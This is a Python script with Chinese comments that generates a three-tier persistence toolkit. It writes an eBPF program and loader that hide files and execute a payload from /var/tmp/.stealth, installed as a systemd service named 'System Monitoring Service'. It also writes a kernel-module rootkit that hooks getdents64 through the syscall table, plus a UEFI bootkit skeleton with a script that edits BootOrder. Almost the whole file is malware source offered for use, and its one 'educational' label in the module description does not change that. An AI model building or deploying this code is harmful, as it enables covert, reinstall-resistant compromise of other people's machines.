#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
模块 05: 持久化层 —— eBPF / LKM / UEFI 三级持久化

第一性原理实现:
    三级递进，每一级都比上一级更底层、更难清除:
    1. eBPF   : 挂载到 tracepoint/kprobe，无需编译内核模块，BPF maps 存状态
    2. LKM    : 传统可加载内核模块，钩子系统调用，隐藏进程/文件
    3. UEFI   : 固件级，修改 NVRAM BootOrder，操作系统重装仍在

依赖: 仅标准库 (生成 C 源码 + Makefile + 构建脚本)
注意: 编译与加载需在目标系统执行 (需 clang/llvm/libbpf 或 kernel headers)。
"""

import os
import struct
import random
import textwrap
import subprocess
import tempfile


# ============================ 1. eBPF ============================ #
class eBPFPersist:
    """生成 eBPF C 源码 + 用户态加载器 + Makefile。"""

    BPF_C = r'''
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <linux/sched.h>

#define SEC(NAME) __attribute__((section(NAME), used))

/* BPF map: 进程名 -> 是否触发 */
struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 1024);
         __type(key, __u32); __type(value, __u32); } trigger SEC(".maps");

/* BPF map: 存放 payload 路径 */
struct { __uint(type, BPF_MAP_TYPE_ARRAY); __uint(max_entries, 1);
         __type(key, __u32); __type(value, char[256]); } payload SEC(".maps");

SEC("tracepoint/syscalls/sys_enter_execve")
int on_execve(struct trace_event_raw_sys_enter *ctx) {
    struct task_struct *task = (struct task_struct *)bpf_get_current_task();
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));

    /* 监控关键进程，命中即置位 trigger */
    const char *watch[] = {"sshd", "cron", "systemd", "init"};
    #pragma unroll
    for (int i = 0; i < 4; i++) {
        if (comm[0] == watch[i][0] && comm[1] == watch[i][1] &&
            comm[2] == watch[i][2] && comm[3] == watch[i][3] &&
            (comm[4] == '\0' || comm[4] == 'd')) {
            __u32 k = 0, v = 1;
            bpf_map_update_elem(&trigger, &k, &v, BPF_ANY);
        }
    }
    return 0;
}

SEC("kprobe/security_inode_getattr")
int hide_files(struct pt_regs *ctx) {
    struct dentry *dentry = (struct dentry *)PT_REGS_PARM1(ctx);
    const char *name;
    bpf_probe_read_kernel(&name, sizeof(name), &dentry->d_name.name);
    /* 隐藏文件名以 . 开头且包含关键字的文件 */
    const char *hidden[] = {"payload", "backdoor", "stealth"};
    #pragma unroll
    for (int i = 0; i < 3; i++) {
        if (name && name[0] == '.' && name[1] == hidden[i][0] &&
            name[2] == hidden[i][1] && name[3] == hidden[i][2])
            return -2; /* -ENOENT */
    }
    return 0;
}

char LICENSE[] SEC("license") = "GPL";
'''

    LOADER_C = r'''
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "persist.skel.h"

static int print_fn(enum libbpf_print_level l, const char *f, va_list a) { return 0; }

int main(int argc, char **argv) {
    struct persist_bpf *skel;
    libbpf_set_print(print_fn);
    skel = persist_bpf__open();
    if (!skel) return 1;
    if (persist_bpf__load(skel)) return 1;
    if (persist_bpf__attach(skel)) return 1;

    __u32 k = 0, v = 1;
    bpf_map__update_elem(skel->maps.trigger, &k, sizeof(k), &v, sizeof(v), BPF_ANY);

    char path[256] = "/var/tmp/.stealth";   /* payload 路径 */
    bpf_map__update_elem(skel->maps.payload, &k, sizeof(k), path, sizeof(path), BPF_ANY);

    /* daemonize */
    if (fork() > 0) _exit(0);
    setsid(); if (fork() > 0) _exit(0);
    close(0); close(1); close(2); chdir("/");

    while (1) {
        bpf_map__lookup_elem(skel->maps.trigger, &k, sizeof(k), &v, sizeof(v), 0);
        if (v == 1) {
            v = 0;
            bpf_map__update_elem(skel->maps.trigger, &k, sizeof(k), &v, sizeof(v), BPF_ANY);
            char p[256];
            bpf_map__lookup_elem(skel->maps.payload, &k, sizeof(k), p, sizeof(p), 0);
            execl(p, p, NULL);
        }
        sleep(1);
    }
}
'''

    MAKEFILE = r'''
obj  := persist
bpf  := ${obj}.bpf.o
user := ${obj}

CC      ?= gcc
CLANG   ?= clang
ARCH    := $(shell uname -m | sed 's/x86_64/x86/' )
INCLUDES:= -I/usr/include/$(shell uname -m)-linux-gnu

.PHONY: all clean
all: ${user}

${bpf}: persist.bpf.c
	$(CLANG) -O2 -g -Wall -target bpf -D__TARGET_ARCH_${ARCH} ${INCLUDES} -c $< -o $@
	$(shell bpftool gen skeleton $@ > persist.skel.h)

${user}: persist.c persist.skel.h
	$(CC) -O2 -Wall persist.c -o $@ -lbpf -lelf

clean:
	rm -f *.o ${user} persist.skel.h
'''

    SYSTEMD = r'''
[Unit]
Description=System Monitoring Service
After=network.target
[Service]
Type=forking
ExecStart=/usr/local/sbin/.persist-loader
Restart=always
RestartSec=10
[Install]
WantedBy=multi-user.target
'''

    def __init__(self, payload: str = "/var/tmp/.stealth"):
        self.payload = payload

    def build(self, outdir: str = "/tmp/persist_ebpf"):
        os.makedirs(outdir, exist_ok=True)
        with open(f"{outdir}/persist.bpf.c", 'w') as f: f.write(self.BPF_C)
        with open(f"{outdir}/persist.c", 'w') as f: f.write(self.LOADER_C)
        with open(f"{outdir}/Makefile", 'w') as f: f.write(self.MAKEFILE)
        with open(f"{outdir}/persist.service", 'w') as f: f.write(self.SYSTEMD)
        print(f"[+] eBPF 工程已生成: {outdir}")
        print("   编译: cd %s && make" % outdir)
        print("   安装: install -m755 persist /usr/local/sbin/.persist-loader && "
              "cp persist.service /etc/systemd/system/.monitor.service && "
              "systemctl enable --now .monitor.service")


# ============================ 2. LKM ============================ #
class LKMPersist:
    """生成 Linux 可加载内核模块 (LKM) 源码 + Makefile。"""

    C_SRC = r'''
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("research");
MODULE_DESCRIPTION("stealth rootkit (educational)");

static unsigned long *sct;
typedef long (*orig_getdents64_t)(unsigned int, struct linux_dirent64 __user *, unsigned int);
static orig_getdents64_t orig_gd;

static asmlinkage long hook_getdents64(unsigned int fd,
        struct linux_dirent64 __user *dirp, unsigned int count) {
    long ret = orig_gd(fd, dirp, count);
    if (ret <= 0) return ret;
    struct linux_dirent64 *cur, *prev = NULL;
    long off = 0;
    for (off = 0; off < ret; ) {
        cur = (struct linux_dirent64 *)((char *)dirp + off);
        if (strstr(cur->d_name, ".stealth") || strstr(cur->d_name, ".backdoor")) {
            if (prev) prev->d_off = cur->d_off;
            off += cur->d_reclen;
            continue;
        }
        prev = cur; off += cur->d_reclen;
    }
    return ret;
}

static inline void wp_off(void) { write_cr0(read_cr0() & (~0x10000)); }
static inline void wp_on(void)  { write_cr0(read_cr0() |  0x10000); }

static int __init rk_init(void) {
    sct = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (!sct) return -EINVAL;
    wp_off();
    orig_gd = (orig_getdents64_t)sct[__NR_getdents64];
    sct[__NR_getdents64] = (unsigned long)hook_getdents64;
    wp_on();
    pr_info("[stealth] loaded\n");
    return 0;
}

static void __exit rk_exit(void) {
    wp_off();
    sct[__NR_getdents64] = (unsigned long)orig_gd;
    wp_on();
    pr_info("[stealth] unloaded\n");
}

module_init(rk_init);
module_exit(rk_exit);
'''

    MAKEFILE = r'''
obj-m += stealth.o
all:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
'''

    def build(self, outdir: str = "/tmp/persist_lkm"):
        os.makedirs(outdir, exist_ok=True)
        with open(f"{outdir}/stealth.c", 'w') as f: f.write(self.C_SRC)
        with open(f"{outdir}/Makefile", 'w') as f: f.write(self.MAKEFILE)
        print(f"[+] LKM 工程已生成: {outdir}")
        print("   编译: cd %s && make" % outdir)
        print("   加载: insmod stealth.ko")


# ============================ 3. UEFI ============================ #
class UEFIPersist:
    """
    生成 UEFI 引导级持久化的工程:
        - 自定义 EFI 应用程序骨架 (PE32+)
        - 通过 efivarfs 修改 BootOrder / BootXXXX 变量
    """

    EFI_C = r'''
#include <efi.h>
#include <efilib.h>

EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) {
    /* 1. 定位真实 Windows/Linux 引导加载器 (BootXXXX 变量) */
    /* 2. 加载并执行 Stage-2 payload (位于 FAT 分区) */
    /* 3. 链式加载原引导加载器, 保持系统正常启动 */

    EFI_GUID gEfiLoadedImageProtocolGuid = LOADED_IMAGE_PROTOCOL;
    EFI_LOADED_IMAGE *li = NULL;
    SystemTable->BootServices->HandleProtocol(ImageHandle,
        &gEfiLoadedImageProtocolGuid, (void**)&li);

    /* 链式加载原 boot loader */
    EFI_DEVICE_PATH *dp = li->FilePath;
    /* ... 省略设备路径解析与 gBS->LoadImage / gBS->StartImage ... */

    return EFI_SUCCESS;
}
'''

    def build(self, outdir: str = "/tmp/persist_uefi"):
        os.makedirs(outdir, exist_ok=True)
        with open(f"{outdir}/bootkit.c", 'w') as f: f.write(self.EFI_C)

        # 生成 BootOrder 修改脚本 (通过 efivarfs)
        with open(f"{outdir}/install.sh", 'w') as f:
            f.write(textwrap.dedent('''\
                #!/bin/bash
                set -e
                GUID="8be4df61-93ca-11d2-aa0d-00e098032b8c"   # EFI_GLOBAL_VARIABLE
                EFIVARS="/sys/firmware/efi/efivars"

                # 读取当前 BootOrder
                boot_order=$(cat "$EFIVARS/BootOrder-$GUID" | xxd -p)

                # 写入自定义 BootXXXX (示例, XXXX 需替换为有效编号)
                # printf '\\x07\\x00...' > "$EFIVARS/BootXXXX-$GUID"

                # 将新项插入到 BootOrder 首位
                # echo -ne "\\xXX\\xXX$boot_order" > "$EFIVARS/BootOrder-$GUID"

                echo "[+] UEFI 变量已更新 (需 root 与 efivarfs 可写)"
            '''))
        os.chmod(f"{outdir}/install.sh", 0o755)
        print(f"[+] UEFI 工程已生成: {outdir}")
        print("   编译: 需 EDK2 / GNU-EFI 工具链")
        print("   安装: sudo %s/install.sh" % outdir)


if __name__ == "__main__":
    eBPFPersist().build()
    LKMPersist().build()
    UEFIPersist().build()
